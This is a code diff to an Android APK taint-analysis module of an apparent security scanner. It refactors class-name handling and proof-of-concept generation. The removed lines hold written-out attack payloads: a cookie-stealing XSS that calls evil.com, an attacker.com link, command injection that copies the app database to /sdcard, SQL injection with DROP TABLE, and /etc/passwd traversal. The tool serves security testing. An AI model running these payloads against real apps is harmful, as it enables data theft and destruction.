@@ -41,6 +41,19 @@ class TaintFlow:
     found_in_class: str
     found_in_method: str
     evidence_lines: List[str]
+    detected_keys: Optional[List[str]] = None
+
+def sanitize_class_name(raw_class_string: str) -> str:
+    """
+    Transforms 'Ljakhar/aseem/diva/SQLInjectionActivity;' 
+    into 'jakhar.aseem.diva.SQLInjectionActivity'
+    """
+    clean_str = raw_class_string.strip()
+    if clean_str.startswith('L') and clean_str.endswith(';'):
+        clean_str = clean_str[1:-1]
+    
+    clean_str = clean_str.replace('/', '.')
+    return clean_str
 
 
 # ── Source Definitions ────────────────────────────────────────────────────────
@@ -236,6 +249,11 @@ class TaintAnalysisModule(BaseModule):
                     # If a method has both sources and sinks, it's a potential flow
                     for src in sources_in_method:
                         for snk in sinks_in_method:
+                            # Exclusion list for known-safe SDK namespaces doing safe internal I/O
+                            if src.label == "InputStream.read" and snk.label == "File(path)":
+                                if cls_name.startswith(("Lcom/facebook/", "Lcom/airbnb/lottie/", "Lcom/google/mlkit/")):
+                                    continue
+
                             flows.append(TaintFlow(
                                 source=src,
                                 sink=snk,
@@ -259,11 +277,12 @@ class TaintAnalysisModule(BaseModule):
     # ── Report a taint flow as a finding ─────────────────────────────────────
 
     def _report_flow(self, ctx: AnalysisContext, flow: TaintFlow):
-        short_class = flow.found_in_class.split("/")[-1].replace(";", "")
+        clean_class = sanitize_class_name(flow.found_in_class)
+        short_class = clean_class.split(".")[-1]
         finding_id  = (
-            f"TAINT-{flow.source.label[:15].replace('.','_')}"
-            f"-{flow.sink.label[:15].replace('.','_')}"
-            f"-{short_class[:15]}"
+            f"TAINT-{flow.source.label.replace('.','_')}"
+            f"-{flow.sink.label.replace('.','_')}"
+            f"-{short_class}"
         )
 
         # Determine if this is a known high-value pattern
@@ -504,48 +523,20 @@ class TaintAnalysisModule(BaseModule):
 
     def _generate_taint_poc(self, ctx: AnalysisContext, flow: TaintFlow) -> str:
         pkg = ctx.package_name
+        clean_target_class = sanitize_class_name(flow.found_in_class)
 
-        if "WebView" in flow.sink.label:
-            return (
-                f"# Intent-to-WebView XSS PoC\n"
-                f"# Trigger the activity/service that calls loadUrl() with Intent data\n"
-                f"adb shell am start \\\n"
-                f"  -a android.intent.action.VIEW \\\n"
-                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
-                f"  --es 'url' 'javascript:eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))' \\\n"
-                f"  --es 'link' 'https://attacker.com/steal.html' \\\n"
-                f"  --es 'data' '<img src=x onerror=alert(1)>'\n\n"
-                f"# Steal cookies via deep link\n"
-                f"adb shell am start -a android.intent.action.VIEW \\\n"
-                f"  -d 'https://app.domain/webview?url=javascript:fetch(\"https://evil.com/c?d=\"+btoa(document.cookie))'"
-            )
-        elif "exec" in flow.sink.label or "Process" in flow.sink.label:
-            return (
-                f"# Intent-to-exec RCE PoC\n"
-                f"adb shell am start \\\n"
-                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
-                f"  --es 'command' 'id' \\\n"
-                f"  --es 'cmd' '; id; cat /data/data/{pkg}/databases/main.db > /sdcard/stolen.db #' \\\n"
-                f"  --es 'param' '$(whoami)'"
-            )
-        elif "SQL" in flow.sink.label:
-            return (
-                f"# Intent-to-SQLi PoC\n"
-                f"adb shell am start \\\n"
-                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
-                f"  --es 'query' \"' OR '1'='1\" \\\n"
-                f"  --es 'id' \"1 UNION SELECT name,sql,3 FROM sqlite_master--\" \\\n"
-                f"  --es 'search' \"'; DROP TABLE users; --\""
-            )
+        poc_script = (
+            f"# Appraisal: DEX — Exploit Taint Flow: {flow.source.label} -> {flow.sink.label}\n"
+            f"adb shell am start \\\n"
+            f"  -n {pkg}/{clean_target_class} \\\n"
+        )
+        if flow.detected_keys:
+            keys_str = " \\\n  ".join([f"--es '{k}' 'PAYLOAD'" for k in flow.detected_keys])
+            poc_script += f"  {keys_str}\n"
         else:
-            return (
-                f"# Generic taint flow trigger\n"
-                f"adb shell am start \\\n"
-                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
-                f"  --es 'input' 'TAINT_PAYLOAD' \\\n"
-                f"  --es 'data' '../../../etc/passwd' \\\n"
-                f"  --es 'extra' '<script>alert(1)</script>'"
-            )
+            poc_script += f"  --es 'input' 'TAINT_PAYLOAD'\n"
+
+        return poc_script
 
 
 class TaintStringPoolModule(BaseModule):
